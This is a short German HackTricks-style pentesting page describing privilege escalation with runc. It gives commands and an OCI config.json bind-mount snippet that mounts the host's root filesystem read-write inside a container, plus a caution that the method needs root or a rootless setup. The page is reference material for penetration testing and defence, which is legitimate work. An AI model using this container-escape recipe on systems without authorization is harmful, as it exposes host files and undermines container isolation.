# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn du mehr über **runc** erfahren möchtest, findest du auf der folgenden Seite weitere Informationen:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Wenn `runc` für einen Prozess mit Root-Rechten auf dem Host verfügbar ist, kannst du ein OCI bundle verwenden, dessen Mount-Konfiguration das `/` des Hosts rekursiv nach `/` innerhalb des Containers bind-mountet und dadurch das Host-Dateisystem in diesem Mount-Namespace freigibt.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Der dokumentierte `runc run`-Workflow ist rootful: Die eigenen Beispiele von runc bezeichnen ihn als „run as root“. Ein unprivilegierter Benutzer benötigt eine rootless-Konfiguration wie `runc spec --rootless`, und runc dokumentiert, dass User namespaces für diesen Modus aktiviert sein müssen.<sup>[[1]](#references)</sup>

## References

- [1] [runc: CLI-Tool zum Erzeugen und Ausführen von Containern](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
